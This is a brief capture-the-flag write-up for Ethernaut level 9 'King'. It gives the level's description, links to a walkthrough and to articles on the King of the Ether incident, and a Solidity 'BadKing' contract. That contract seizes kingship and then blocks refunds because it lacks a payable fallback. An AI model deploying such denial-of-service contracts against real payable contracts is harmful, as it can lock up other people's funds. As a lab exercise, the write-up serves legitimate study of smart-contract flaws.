# 9. King
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

**END** looked up solution
https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b
Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

was on the right track - https://hackernoon.com/smart-contract-attacks-part-2-ponzi-games-gone-wrong-d5a8b1a98dd8

In this case, see: King of the Ether and King of the Ether Postmortem

BadKing.sol
```
pragma solidity ^0.6.0;

contract BadKing {

  function becomeKing(address king, uint val) public payable {
    (bool result, bytes memory data) = king.call.value(val)("");
    if(!result) revert();
  }

  // OMG NO PAYABLE FALLBACK!!
}
```